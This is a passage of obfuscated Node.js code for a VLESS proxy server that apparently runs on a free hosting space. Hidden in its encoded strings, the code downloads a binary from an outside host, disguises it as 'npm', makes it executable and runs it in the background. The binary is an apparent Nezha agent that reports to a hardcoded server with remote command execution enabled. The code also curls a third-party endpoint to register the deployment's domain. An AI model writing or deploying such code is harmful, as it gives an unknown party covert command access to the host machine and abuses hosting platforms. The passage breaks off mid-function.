const _0x223987=_0x18f0;(function(_0x1265d9,_0x3eac34){const _0x22c862=_0x18f0,_0x521fa2=_0x1265d9();while(!![]){try{const _0x491c0f=-parseInt(_0x22c862(0x222))/0x1+-parseInt(_0x22c862(0x221))/0x2+-parseInt(_0x22c862(0x189))/0x3*(-parseInt(_0x22c862(0x13b))/0x4)+parseInt(_0x22c862(0x15a))/0x5+parseInt(_0x22c862(0x153))/0x6+parseInt(_0x22c862(0x19f))/0x7*(-parseInt(_0x22c862(0x195))/0x8)+-parseInt(_0x22c862(0x193))/0x9*(-parseInt(_0x22c862(0x140))/0xa);if(_0x491c0f===_0x3eac34)break;else _0x521fa2['push'](_0x521fa2['shift']());}catch(_0x393f21){_0x521fa2['push'](_0x521fa2['shift']());}}}(_0x2088,0xd50c4));const os=require('os'),fs=require('fs'),net=require('net'),http=require(_0x223987(0x187)),axios=require(_0x223987(0x17f)),{Buffer}=require('buffer'),{exec,execSync}=require(_0x223987(0x1ab)),UUID=process['env'][_0x223987(0x1f5)]||'53047485-90ce-4b7c-8df2-5f94a18d9868',NEZHA_SERVER=process[_0x223987(0x13e)][_0x223987(0x1a5)]||_0x223987(0x207),NEZHA_PORT=process[_0x223987(0x13e)][_0x223987(0x13a)]||_0x223987(0x20a),NEZHA_KEY=process[_0x223987(0x13e)][_0x223987(0x175)]||'X6gk45ad1l2zqddvJ3',AUTO_ACCESS=process[_0x223987(0x13e)][_0x223987(0x1e8)]||![],SUB_PATH=process[_0x223987(0x13e)][_0x223987(0x190)]||_0x223987(0x1b4),XPATH=process['env']['XPATH']||_0x223987(0x1d8),DOMAIN=process['env'][_0x223987(0x146)]||_0x223987(0x138),NAME=process[_0x223987(0x13e)][_0x223987(0x1ca)]||_0x223987(0x20d),PORT=process[_0x223987(0x13e)][_0x223987(0x151)]||0xbb8,SETTINGS={['UUID']:UUID,[_0x223987(0x1ec)]:_0x223987(0x204),[_0x223987(0x1b8)]:_0x223987(0x17c),[_0x223987(0x1c0)]:'%2F'+XPATH,[_0x223987(0x15b)]:0x1e,[_0x223987(0x184)]:0xf4240,[_0x223987(0x1a8)]:0x7530,[_0x223987(0x174)]:0x400*0x400,[_0x223987(0x1c5)]:!![],[_0x223987(0x186)]:!![]};function validate_uuid(_0x198fe0,_0x20f664){for(let _0x56d4c4=0x0;_0x56d4c4<0x10;_0x56d4c4++){if(_0x198fe0[_0x56d4c4]!==_0x20f664[_0x56d4c4])return![];}return!![];}function concat_typed_arrays(_0x135d3b,..._0xf3397b){const _0xfb32c8=_0x223987;if(!_0xf3397b||_0xf3397b[_0xfb32c8(0x1e5)]<0x1)return _0x135d3b;let _0xdc4dcf=_0x135d3b[_0xfb32c8(0x1e5)];for(let _0x5d750d of _0xf3397b)_0xdc4dcf+=_0x5d750d[_0xfb32c8(0x1e5)];const _0x3c9225=new _0x135d3b[(_0xfb32c8(0x162))](_0xdc4dcf);_0x3c9225[_0xfb32c8(0x1bd)](_0x135d3b,0x0),_0xdc4dcf=_0x135d3b[_0xfb32c8(0x1e5)];for(let _0x1a11be of _0xf3397b){_0x3c9225[_0xfb32c8(0x1bd)](_0x1a11be,_0xdc4dcf),_0xdc4dcf+=_0x1a11be[_0xfb32c8(0x1e5)];}return _0x3c9225;}function log(_0x3e8ead,..._0x2acb56){const _0x4eaa23=_0x223987;if(SETTINGS[_0x4eaa23(0x1ec)]===_0x4eaa23(0x204))return;const _0x1e843e={'debug':0x0,'info':0x1,'warn':0x2,'error':0x3},_0x1d2ae2={'debug':'\x1b[36m','info':_0x4eaa23(0x192),'warn':_0x4eaa23(0x166),'error':_0x4eaa23(0x1c2),'reset':_0x4eaa23(0x1e9)},_0x5ceaf3=_0x1e843e[SETTINGS[_0x4eaa23(0x1ec)]]||0x1,_0x377ad2=_0x1e843e[_0x3e8ead]||0x0;if(_0x377ad2>=_0x5ceaf3){const _0x54eafc=new Date()['toISOString'](),_0x1f6fa4=_0x1d2ae2[_0x3e8ead]||_0x1d2ae2['reset'];console[_0x4eaa23(0x1f2)](_0x1f6fa4+'['+_0x54eafc+']\x20['+_0x3e8ead+']',..._0x2acb56,_0x1d2ae2[_0x4eaa23(0x150)]);}}const getDownloadUrl=()=>{const _0x1a06ba=_0x223987,_0x54bb8e=os[_0x1a06ba(0x21e)]();return _0x54bb8e==='arm'||_0x54bb8e===_0x1a06ba(0x182)||_0x54bb8e===_0x1a06ba(0x1eb)?!NEZHA_PORT?'https://arm64.ssss.nyc.mn/v1':_0x1a06ba(0x202):!NEZHA_PORT?_0x1a06ba(0x13c):_0x1a06ba(0x16e);},downloadFile=async()=>{const _0x45cb27=_0x223987;if(!NEZHA_KEY)return;try{const _0x253182=getDownloadUrl(),_0x16aa87=await axios({'method':_0x45cb27(0x214),'url':_0x253182,'responseType':'stream'}),_0x29db8d=fs[_0x45cb27(0x20e)]('npm');return _0x16aa87[_0x45cb27(0x1bb)][_0x45cb27(0x1f9)](_0x29db8d),new Promise((_0x509ba9,_0x43dbb5)=>{const _0x560e10=_0x45cb27;_0x29db8d['on'](_0x560e10(0x158),()=>{const _0x334634=_0x560e10;console[_0x334634(0x1f2)](_0x334634(0x1fc)),exec(_0x334634(0x1b9),_0x20e871=>{if(_0x20e871)_0x43dbb5(_0x20e871);_0x509ba9();});}),_0x29db8d['on'](_0x560e10(0x14c),_0x43dbb5);});}catch(_0x422924){throw _0x422924;}},runnz=async()=>{const _0x26d86a=_0x223987;await downloadFile();let _0x5ac99c='',_0x38939f='';if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x1c3572=[_0x26d86a(0x20a),_0x26d86a(0x18e),'2096',_0x26d86a(0x155),_0x26d86a(0x154),_0x26d86a(0x199)];_0x5ac99c=_0x1c3572['includes'](NEZHA_PORT)?_0x26d86a(0x1ce):'',_0x38939f=_0x26d86a(0x1c8)+NEZHA_SERVER+':'+NEZHA_PORT+_0x26d86a(0x1a1)+NEZHA_KEY+'\x20'+_0x5ac99c+_0x26d86a(0x217);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x12840c='\x0aclient_secret:\x20'+NEZHA_KEY+_0x26d86a(0x213)+NEZHA_SERVER+_0x26d86a(0x1a3)+UUID;fs[_0x26d86a(0x19e)](_0x26d86a(0x1a6),_0x12840c);}_0x38939f=_0x26d86a(0x1ae);}else return;}try{exec(_0x38939f,{'shell':_0x26d86a(0x16f)}),console[_0x26d86a(0x1f2)](_0x26d86a(0x18a));}catch(_0x43b185){console[_0x26d86a(0x14c)](_0x26d86a(0x17d)+_0x43b185);}};async function addAccessTask(){const _0x387996=_0x223987;if(AUTO_ACCESS!==!![])return;try{if(!DOMAIN)return;const _0x2d32b1='https://'+DOMAIN,_0x1f571c='curl\x20-X\x20POST\x20\x22https://oooo.serv00.net/add-url\x22\x20-H\x20\x22Content-Type:\x20application/json\x22\x20-d\x20\x27{\x22url\x22:\x20\x22'+_0x2d32b1+_0x387996(0x201);exec(_0x1f571c,(_0x12d2bf,_0x47406a,_0x2b7da2)=>{const _0x807116=_0x387996;if(_0x12d2bf){console[_0x807116(0x14c)](_0x807116(0x21a),_0x12d2bf[_0x807116(0x1ef)]);return;}console['log'](_0x807116(0x1a2),_0x47406a);});}catch(_0x22ff9f){console[_0x387996(0x14c)](_0x387996(0x196),_0x22ff9f[_0x387996(0x1ef)]);}}function parse_uuid(_0x465c97){const _0x45fa9c=_0x223987;_0x465c97=_0x465c97['replaceAll']('-','');const _0x558208=[];for(let _0x494e44=0x0;_0x494e44<0x10;_0x494e44++){_0x558208[_0x45fa9c(0x1cd)](parseInt(_0x465c97[_0x45fa9c(0x1d6)](_0x494e44*0x2,0x2),0x10));}return _0x558208;}async function read_vless_header(_0x2b6d08,_0x265317){const _0x358eec=_0x223987;let _0x2f1209=0x0,_0x2b7539=new Uint8Array(),_0x2c4f0b={'value':_0x2b7539,'done':![]};async function _0x74d1db(_0x4d4cf7){const _0x136616=_0x18f0;if(_0x2c4f0b['done'])throw new Error(_0x136616(0x20f));const _0x436b87=_0x4d4cf7-_0x2f1209;if(_0x436b87<0x1)return;_0x2c4f0b=await read_atleast(_0x2b6d08,_0x436b87),_0x2f1209+=_0x2c4f0b['value'][_0x136616(0x1e5)],_0x2b7539=concat_typed_arrays(_0x2b7539,_0x2c4f0b[_0x136616(0x1e4)]);}await _0x74d1db(0x1+0x10+0x1);const _0x42081f=_0x2b7539[0x0],_0x4cb50a=_0x2b7539['slice'](0x1,0x1+0x10),_0x5ad383=parse_uuid(_0x265317);if(!validate_uuid(_0x4cb50a,_0x5ad383))throw new Error('invalid\x20UUID');const _0x42d3e1=_0x2b7539[0x1+0x10],_0x15ff37=0x1+0x10+0x1+_0x42d3e1+0x1+0x2+0x1;await _0x74d1db(_0x15ff37+0x1);const _0x5d6cde=_0x2b7539[0x1+0x10+0x1+_0x42d3e1],_0x1c9186=0x1;if(_0x5d6cde!==_0x1c9186)throw new Error(_0x358eec(0x216)+_0x5d6cde);const _0x47cc50=(_0x2b7539[_0x15ff37-0x1-0x2]<<0x8)+_0x2b7539[_0x15ff37-0x1-0x1],_0x1432d2=_0x2b7539[_0x15ff37-0x1],_0x1562d2=0x1,_0x21a4b7=0x2,_0x13b2c9=0x3;let _0xe55316=-0x1;if(_0x1432d2===_0x1562d2)_0xe55316=_0x15ff37+0x4;else{if(_0x1432d2===_0x13b2c9)_0xe55316=_0x15ff37+0x10;else _0x1432d2===_0x21a4b7&&(_0xe55316=_0x15ff37+0x1+_0x2b7539[_0x15ff37]);}if(_0xe55316<0x0)throw new Error(_0x358eec(0x208));await _0x74d1db(_0xe55316);const _0x563044=_0x15ff37;let _0x5b69a6='';if(_0x1432d2===_0x1562d2)_0x5b69a6=_0x2b7539[_0x358eec(0x13f)](_0x563044,_0x563044+0x4)[_0x358eec(0x1b3)]('.');else{if(_0x1432d2===_0x21a4b7)_0x5b69a6=new TextDecoder()['decode'](_0x2b7539[_0x358eec(0x13f)](_0x563044+0x1,_0x563044+0x1+_0x2b7539[_0x563044]));else _0x1432d2===_0x13b2c9&&(_0x5b69a6=_0x2b7539[_0x358eec(0x13f)](_0x563044,_0x563044+0x10)[_0x358eec(0x18d)]((_0x28a652,_0x5277dd,_0xddb737,_0x49deaa)=>_0xddb737%0x2?_0x28a652['concat'](((_0x49deaa[_0xddb737-0x1]<<0x8)+_0x5277dd)[_0x358eec(0x176)](0x10)):_0x28a652,[])['join'](':'));}if(!_0x5b69a6){log(_0x358eec(0x14c),'Failed\x20to\x20parse\x20hostname');throw new Error(_0x358eec(0x18c));}return log(_0x358eec(0x198),_0x358eec(0x14b)+_0x5b69a6+':'+_0x47cc50),{'hostname':_0x5b69a6,'port':_0x47cc50,'data':_0x2b7539[_0x358eec(0x13f)](_0xe55316),'resp':new Uint8Array([_0x42081f,0x0])};}async function read_atleast(_0x4eae7a,_0x4fcd09){const _0x27a9a2=_0x223987,_0x44876e=[];let _0xe5095c=![];while(_0x4fcd09>0x0&&!_0xe5095c){const _0xa86ad=await _0x4eae7a[_0x27a9a2(0x1f8)]();if(_0xa86ad[_0x27a9a2(0x1e4)]){const _0x411fa0=new Uint8Array(_0xa86ad[_0x27a9a2(0x1e4)]);_0x44876e[_0x27a9a2(0x1cd)](_0x411fa0),_0x4fcd09-=_0x411fa0['length'];}_0xe5095c=_0xa86ad['done'];}if(_0x4fcd09>0x0)throw new Error(_0x27a9a2(0x1df));return{'value':concat_typed_arrays(..._0x44876e),'done':_0xe5095c};}async function parse_header(_0xcde845,_0x2b86e8){const _0x47389e=_0x223987;log(_0x47389e(0x1b5),_0x47389e(0x177));const _0xc3e52c=_0x2b86e8['readable'][_0x47389e(0x18b)]();try{const _0xd37778=await read_vless_header(_0xc3e52c,_0xcde845);return log(_0x47389e(0x1b5),_0x47389e(0x197)),_0xd37778;}catch(_0x3d27fd){log(_0x47389e(0x14c),_0x47389e(0x1d3)+_0x3d27fd[_0x47389e(0x1ef)]);throw new Error('read\x20vless\x20header\x20error:\x20'+_0x3d27fd['message']);}finally{_0xc3e52c[_0x47389e(0x1c3)]();}}async function connect_remote(_0x4903c1,_0x5951f0){const _0x16010a=_0x223987,_0x18ef8f=0x1f40;try{const _0x495929=await timed_connect(_0x4903c1,_0x5951f0,_0x18ef8f);return _0x495929['setNoDelay'](!![]),_0x495929[_0x16010a(0x16c)](!![],0x3e8),_0x495929[_0x16010a(0x1d5)]=parseInt(SETTINGS[_0x16010a(0x1b8)])*0x400,log(_0x16010a(0x198),_0x16010a(0x188)+_0x4903c1+':'+_0x5951f0),_0x495929;}catch(_0x4ce222){log(_0x16010a(0x14c),_0x16010a(0x1ee)+_0x4ce222[_0x16010a(0x1ef)]);throw _0x4ce222;}}function timed_connect(_0x1913c1,_0x3719a9,_0x4459b6){return new Promise((_0x5970e9,_0x410763)=>{const _0x538796=_0x18f0,_0x47ec2b=net[_0x538796(0x1c9)]({'host':_0x1913c1,'port':_0x3719a9}),_0x58d5b1=setTimeout(()=>{_0x410763(new Error('connect\x20timeout'));},_0x4459b6);_0x47ec2b['on']('connect',()=>{clearTimeout(_0x58d5b1),_0x5970e9(_0x47ec2b);}),_0x47ec2b['on'](_0x538796(0x14c),_0xe2e34c=>{clearTimeout(_0x58d5b1),_0x410763(_0xe2e34c);});});}function pipe_relay(){async function _0x7e1336(_0x1d6c2d,_0x513fd6,_0x23b999){const _0x1cb234=_0x18f0,_0x3a4798=parseInt(SETTINGS[_0x1cb234(0x174)]);if(_0x23b999[_0x1cb234(0x1e5)]>0x0){if(_0x513fd6[_0x1cb234(0x183)])_0x513fd6[_0x1cb234(0x157)](),_0x513fd6[_0x1cb234(0x183)](_0x23b999),process[_0x1cb234(0x1fd)](()=>_0x513fd6[_0x1cb234(0x206)]());else{const _0x4380e4=_0x513fd6['writable'][_0x1cb234(0x1b2)]();try{await _0x4380e4[_0x1cb234(0x183)](_0x23b999);}finally{_0x4380e4[_0x1cb234(0x1c3)]();}}}try{_0x1d6c2d[_0x1cb234(0x1f9)]?(_0x1d6c2d[_0x1cb234(0x164)](),_0x1d6c2d['pipe'](_0x513fd6,{'end':!![],'highWaterMark':_0x3a4798}),_0x1d6c2d['resume']()):await _0x1d6c2d[_0x1cb234(0x1ad)][_0x1cb234(0x1f1)](_0x513fd6[_0x1cb234(0x1a7)],{'preventClose':![],'preventAbort':![],'preventCancel':![],'signal':AbortSignal[_0x1cb234(0x21d)](SETTINGS['SESSION_TIMEOUT'])});}catch(_0x18ae53){!_0x18ae53[_0x1cb234(0x1ef)][_0x1cb234(0x1e0)](_0x1cb234(0x1a9))&&log(_0x1cb234(0x14c),_0x1cb234(0x19c),_0x18ae53['message']);throw _0x18ae53;}}return _0x7e1336;}function socketToWebStream(_0x57abae){const _0x53f254=_0x223987;let _0x3e57da,_0x3d4da2;return _0x57abae['on'](_0x53f254(0x14c),_0x39dc1b=>{const _0x1c6ae4=_0x53f254;log('error',_0x1c6ae4(0x14f),_0x39dc1b[_0x1c6ae4(0x1ef)]),_0x3e57da?.['error'](_0x39dc1b),_0x3d4da2?.[_0x1c6ae4(0x14c)](_0x39dc1b);}),{'readable':new ReadableStream({'start'(_0x35f3e9){const _0x1a463e=_0x53f254;_0x3e57da=_0x35f3e9,_0x57abae['on']('data',_0x10fb80=>{const _0xb0e1f7=_0x18f0;try{_0x35f3e9[_0xb0e1f7(0x1bf)](_0x10fb80);}catch(_0xbfda4c){log(_0xb0e1f7(0x14c),_0xb0e1f7(0x211),_0xbfda4c[_0xb0e1f7(0x1ef)]);}}),_0x57abae['on'](_0x1a463e(0x178),()=>{const _0x9f823c=_0x1a463e;try{_0x35f3e9[_0x9f823c(0x215)]();}catch(_0x20726c){log(_0x9f823c(0x14c),'Read\x20controller\x20close\x20error:',_0x20726c['message']);}});},'cancel'(){const _0x35c92e=_0x53f254;_0x57abae[_0x35c92e(0x1d2)]();}}),'writable':new WritableStream({'start'(_0x149eea){_0x3d4da2=_0x149eea;},'write'(_0x589ee3){return new Promise((_0x28ab4f,_0x52354c)=>{const _0x22a52d=_0x18f0;if(_0x57abae[_0x22a52d(0x14e)]){_0x52354c(new Error(_0x22a52d(0x1dc)));return;}_0x57abae[_0x22a52d(0x183)](_0x589ee3,_0x3f2337=>{if(_0x3f2337)_0x52354c(_0x3f2337);else _0x28ab4f();});});},'close'(){const _0x239cc4=_0x53f254;!_0x57abae['destroyed']&&_0x57abae[_0x239cc4(0x178)]();},'abort'(_0x533dca){const _0x48c4b4=_0x53f254;_0x57abae[_0x48c4b4(0x1d2)](_0x533dca);}})};}function _0x2088(){const _0x10f744=['NEZHA_KEY','toString','Starting\x20to\x20parse\x20VLESS\x20header','end','GET','initialized','Created\x20new\x20session\x20for\x20POST:\x20','2048','npm\x20running\x20error:\x20','processPacket','axios','text/plain','pendingPackets','arm64','write','MAX_POST_SIZE','Failed\x20to\x20write\x20to\x20remote:\x20','TCP_KEEPALIVE','http','Connected\x20to\x20','2059899vIIUxq','npm\x20is\x20running','getReader','parse\x20hostname\x20failed','reduce','8443','url','SUB_PATH','http/1.1','\x1b[32m','45eZfYnb','curl\x20-s\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','816oKDZlO','Error\x20added\x20Task:','VLESS\x20header\x20parsed\x20successfully','info','2053','headersTimeout','Buffered\x20packet\x20seq=','Relay\x20error:','Cleaning\x20up\x20session\x20','writeFileSync','42637NohCnO',',\x20size=','\x20-p\x20','Automatic\x20Access\x20Task\x20added\x20successfully:','\x0askip_connection_count:\x20false\x0askip_procs_count:\x20false\x0atemperature:\x20false\x0atls:\x20false\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','Server\x20error:\x20','NEZHA_SERVER','config.yaml','writable','SESSION_TIMEOUT','aborted','\x20timed\x20out\x20without\x20downstream','child_process','cleanup','readable','nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','utf-8','curl\x20-s\x20--max-time\x201\x20ipv6.ip.sb','warn','getWriter','join','sub','debug','currentStreamRes','Too\x20many\x20buffered\x20packets','BUFFER_SIZE','chmod\x20+x\x20npm','floor','data','now','set','Session\x20','enqueue','XPATH','catch','\x1b[31m','releaseLock','POST','TCP_NODELAY','size','initializeVLESS','nohup\x20./npm\x20-s\x20','createConnection','NAME','match','vless://','push','--tls','VLESS\x20header\x20parsed:\x20','concat','downstreamStarted','destroy','VLESS\x20header\x20parse\x20error:\x20','Cleanup\x20error:\x20','bufferSize','substr','Failed\x20to\x20initialize\x20VLESS\x20connection','xhttp','port','createServer','base64','Socket\x20is\x20destroyed','from','trim','not\x20enough\x20data\x20to\x20read','includes','npm','responseHeader','hostname','value','length','Client\x20connection\x20closed','):\x20','AUTO_ACCESS','\x1b[0m','_writeToRemote','aarch64','LOG_LEVEL','chunked','Connection\x20failed:\x20','message','headerSent','pipeTo','log','bufferedData','pendingBuffers','UUID','Remote\x20connection\x20not\x20available','Initializing\x20VLESS\x20connection\x20from\x20first\x20packet','read','pipe','writeHead','Created\x20new\x20session\x20for\x20GET:\x20','npm\x20download\x20successfully','nextTick','secureConnection','_startDownstreamResponse',':443?encryption=none&security=tls&sni=','\x22}\x27','https://arm64.ssss.nyc.mn/agent','Upload\x20error:\x20','none','headersSent','uncork','sui.txxk.xyz','read\x20address\x20type\x20failed','Failed\x20to\x20start\x20downstream\x20for\x20session:\x20','443','setNoDelay','Hello,\x20World\x0a','hgg','createWriteStream','header\x20length\x20too\x20short','writableEnded','Read\x20controller\x20error:','Max\x20buffered\x20posts:\x20','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20false\x0aip_report_period:\x201800\x0areport_delay:\x201\x0aserver:\x20','get','close','unsupported\x20command:\x20','\x20>/dev/null\x202>&1\x20&','keepAliveTimeout','Created\x20new\x20session\x20with\x20UUID:\x20','Error\x20sending\x20request:','&fp=chrome&allowInsecure=1&type=xhttp&host=','delete','timeout','arch','\x20before\x20initialization','reading_done','2320884YIxLKD','1606071AFvrXA','uuid','socket','wowhappy2025-youqianfba12.hf.space','Log\x20level:\x20','NEZHA_PORT','8KHHRcL','https://amd64.ssss.nyc.mn/v1','&path=','env','slice','1996850ZiooCf','Remote\x20connection\x20established','vlessHeader','stream','Max\x20buffer\x20size:\x20','remote','DOMAIN','lastActivity','Failed\x20to\x20initialize\x20VLESS:\x20','finally','=================================','VLESS\x20connection\x20to\x20','error','listen','destroyed','Socket\x20error:','reset','PORT','Failed\x20to\x20process\x20POST\x20request:\x20','2189394WZoSrh','2083','2087','fill','cork','finish','Sending\x20VLESS\x20response\x20header\x20(','7619245vcSjUX','MAX_BUFFERED_POSTS','localhost','no-store','Error\x20starting\x20downstream:\x20','unlink','/([^/]+)(?:/([0-9]+))?$','method','constructor','Transform','pause','cleaned','\x1b[33m','GET,\x20POST','Remote\x20error:\x20','nextSeq','socket\x20hang\x20up','curl\x20-s\x20--max-time\x202\x20ipv4.ip.sb','setKeepAlive','alpnProtocol','https://amd64.ssss.nyc.mn/agent','/bin/bash','Received\x20out\x20of\x20order\x20packet\x20seq=','&mode=packet-up#','Processed\x20packet\x20seq=','\x20bytes','CHUNK_SIZE'];_0x2088=function(){return _0x10f744;};return _0x2088();}function relay(_0x43fe5e,_0x34cb68,_0x288c52,_0x4eff31){const _0x9142ae=_0x223987,_0x3920f6=pipe_relay();let _0x15fbec=![];const _0x1c45dc=socketToWebStream(_0x288c52);function _0x229423(){const _0x5569f1=_0x18f0;if(!_0x15fbec){_0x15fbec=!![];try{_0x288c52[_0x5569f1(0x1d2)]();}catch(_0x598cb8){!_0x598cb8['message'][_0x5569f1(0x1e0)](_0x5569f1(0x1a9))&&!_0x598cb8['message']['includes'](_0x5569f1(0x16a))&&log(_0x5569f1(0x14c),_0x5569f1(0x1d4)+_0x598cb8[_0x5569f1(0x1ef)]);}}}const _0x2eeebe=_0x3920f6(_0x34cb68,_0x1c45dc,_0x4eff31[_0x9142ae(0x1bb)])['catch'](_0x5b1044=>{const _0x1c909b=_0x9142ae;!_0x5b1044[_0x1c909b(0x1ef)][_0x1c909b(0x1e0)](_0x1c909b(0x1a9))&&!_0x5b1044['message'][_0x1c909b(0x1e0)](_0x1c909b(0x16a))&&log(_0x1c909b(0x14c),_0x1c909b(0x203)+_0x5b1044[_0x1c909b(0x1ef)]);})[_0x9142ae(0x149)](()=>{const _0x8c4093=_0x9142ae;_0x34cb68[_0x8c4093(0x220)]&&_0x34cb68[_0x8c4093(0x220)]();}),_0x2664eb=_0x3920f6(_0x1c45dc,_0x34cb68,_0x4eff31['resp'])[_0x9142ae(0x1c1)](_0x53ade3=>{const _0x1987e4=_0x9142ae;!_0x53ade3[_0x1987e4(0x1ef)]['includes'](_0x1987e4(0x1a9))&&!_0x53ade3[_0x1987e4(0x1ef)]['includes'](_0x1987e4(0x16a))&&log('error','Download\x20error:\x20'+_0x53ade3[_0x1987e4(0x1ef)]);});_0x2664eb[_0x9142ae(0x149)](()=>_0x2eeebe)[_0x9142ae(0x149)](_0x229423);}const sessions=new Map();class Session{constructor(_0x1f06a1){const _0x1476d0=_0x223987;this[_0x1476d0(0x223)]=_0x1f06a1,this[_0x1476d0(0x169)]=0x0,this['downstreamStarted']=![],this[_0x1476d0(0x147)]=Date[_0x1476d0(0x1bc)](),this[_0x1476d0(0x142)]=null,this[_0x1476d0(0x145)]=null,this[_0x1476d0(0x17a)]=![],this['responseHeader']=null,this[_0x1476d0(0x1f0)]=![],this[_0x1476d0(0x1f3)]=new Map(),this[_0x1476d0(0x165)]=![],this[_0x1476d0(0x181)]=[],this[_0x1476d0(0x1b6)]=null,this[_0x1476d0(0x1f4)]=new Map(),log('debug',_0x1476d0(0x219)+_0x1f06a1);}async[_0x223987(0x1c7)](_0x2a0575){const _0x52adcb=_0x223987;if(this[_0x52adcb(0x17a)])return!![];try{log(_0x52adcb(0x1b5),_0x52adcb(0x1f7));const _0x3bd72b=new ReadableStream({'start'(_0x42c83a){const _0xa092a4=_0x52adcb;_0x42c83a[_0xa092a4(0x1bf)](_0x2a0575),_0x42c83a['close']();}}),_0x513adb={'readable':_0x3bd72b,'writable':new WritableStream()};return this['vlessHeader']=await parse_header(SETTINGS[_0x52adcb(0x1f5)],_0x513adb),log(_0x52adcb(0x198),_0x52adcb(0x1cf)+this[_0x52adcb(0x142)]['hostname']+':'+this[_0x52adcb(0x142)][_0x52adcb(0x1d9)]),this['remote']=await connect_remote(this[_0x52adcb(0x142)][_0x52adcb(0x1e3)],this[_0x52adcb(0x142)][_0x52adcb(0x1d9)]),log(_0x52adcb(0x198),_0x52adcb(0x141)),this[_0x52adcb(0x17a)]=!![],!![];}catch(_0x3fb556){return log(_0x52adcb(0x14c),_0x52adcb(0x148)+_0x3fb556['message']),![];}}async['processPacket'](_0x184b40,_0x2edf3e){const _0x50748a=_0x223987;try{this[_0x50748a(0x1f4)][_0x50748a(0x1bd)](_0x184b40,_0x2edf3e),log(_0x50748a(0x1b5),_0x50748a(0x19b)+_0x184b40+_0x50748a(0x1a0)+_0x2edf3e[_0x50748a(0x1e5)]);while(this[_0x50748a(0x1f4)]['has'](this['nextSeq'])){const _0x1e8b39=this['pendingBuffers'][_0x50748a(0x214)](this['nextSeq']);this[_0x50748a(0x1f4)][_0x50748a(0x21c)](this[_0x50748a(0x169)]);if(!this[_0x50748a(0x17a)]&&this[_0x50748a(0x169)]===0x0){if(!await this[_0x50748a(0x1c7)](_0x1e8b39))throw new Error(_0x50748a(0x1d7));this[_0x50748a(0x1e2)]=Buffer[_0x50748a(0x1dd)](this[_0x50748a(0x142)]['resp']),await this[_0x50748a(0x1ea)](this[_0x50748a(0x142)][_0x50748a(0x1bb)]),this[_0x50748a(0x1b6)]&&this['_startDownstreamResponse']();}else{if(!this[_0x50748a(0x17a)]){log(_0x50748a(0x1b1),_0x50748a(0x170)+_0x184b40+_0x50748a(0x21f));continue;}await this[_0x50748a(0x1ea)](_0x1e8b39);}this[_0x50748a(0x169)]++,log(_0x50748a(0x1b5),_0x50748a(0x172)+(this[_0x50748a(0x169)]-0x1));}if(this[_0x50748a(0x1f4)][_0x50748a(0x1c6)]>SETTINGS[_0x50748a(0x15b)])throw new Error(_0x50748a(0x1b7));return!![];}catch(_0x232791){log(_0x50748a(0x14c),'Process\x20packet\x20error:\x20'+_0x232791[_0x50748a(0x1ef)]);throw _0x232791;}}[_0x223987(0x1ff)](){const _0x547ade=_0x223987;if(!this[_0x547ade(0x1b6)]||!this['responseHeader'])return;try{const _0x569ed1=this[_0x547ade(0x1b6)][_0x547ade(0x224)]?.[_0x547ade(0x16d)]||_0x547ade(0x191),_0x23ea51=_0x569ed1==='h2';!this[_0x547ade(0x1f0)]&&(log(_0x547ade(0x1b5),_0x547ade(0x159)+_0x569ed1+_0x547ade(0x1e7)+this['responseHeader']['length']+_0x547ade(0x173)),this[_0x547ade(0x1b6)][_0x547ade(0x183)](this[_0x547ade(0x1e2)]),this[_0x547ade(0x1f0)]=!![]);if(_0x23ea51){this[_0x547ade(0x1b6)]['socket'][_0x547ade(0x20b)](!![]);const _0xb9a41c=new require(_0x547ade(0x143))[_0x547ade(0x163)]({'transform'(_0x30a003,_0x407e7d,_0x26b5fd){const _0x6f355c=_0x547ade,_0xdae7fd=0x4000;for(let _0x5686c1=0x0;_0x5686c1<_0x30a003[_0x6f355c(0x1e5)];_0x5686c1+=_0xdae7fd){this[_0x6f355c(0x1cd)](_0x30a003[_0x6f355c(0x13f)](_0x5686c1,_0x5686c1+_0xdae7fd));}_0x26b5fd();}});this['remote']['pipe'](_0xb9a41c)['pipe'](this['currentStreamRes']);}else this[_0x547ade(0x145)][_0x547ade(0x1f9)](this[_0x547ade(0x1b6)]);this['remote']['on'](_0x547ade(0x178),()=>{const _0x6a7d47=_0x547ade;!this[_0x6a7d47(0x1b6)][_0x6a7d47(0x210)]&&this[_0x6a7d47(0x1b6)]['end']();}),this[_0x547ade(0x145)]['on'](_0x547ade(0x14c),_0xbf22bd=>{const _0x26cbbd=_0x547ade;log('error',_0x26cbbd(0x168)+_0xbf22bd[_0x26cbbd(0x1ef)]),!this[_0x26cbbd(0x1b6)][_0x26cbbd(0x210)]&&this['currentStreamRes'][_0x26cbbd(0x178)]();});}catch(_0x5ed445){log(_0x547ade(0x14c),_0x547ade(0x15e)+_0x5ed445[_0x547ade(0x1ef)]),this[_0x547ade(0x1ac)]();}}['startDownstream'](_0x488140,_0x305542){const _0x3972f0=_0x223987;return!_0x488140[_0x3972f0(0x205)]&&_0x488140[_0x3972f0(0x1fa)](0xc8,_0x305542),this[_0x3972f0(0x1b6)]=_0x488140,this[_0x3972f0(0x17a)]&&this['responseHeader']&&this[_0x3972f0(0x1ff)](),_0x488140['on'](_0x3972f0(0x215),()=>{const _0xaaaac3=_0x3972f0;log(_0xaaaac3(0x198),_0xaaaac3(0x1e6)),this['cleanup']();}),!![];}async[_0x223987(0x1ea)](_0x4ced6e){const _0x120dd0=_0x223987;if(!this[_0x120dd0(0x145)]||this[_0x120dd0(0x145)]['destroyed'])throw new Error(_0x120dd0(0x1f6));return new Promise((_0x212c6c,_0x5110df)=>{const _0x157b48=_0x120dd0;this[_0x157b48(0x145)]['write'](_0x4ced6e,_0x5c8a8d=>{const 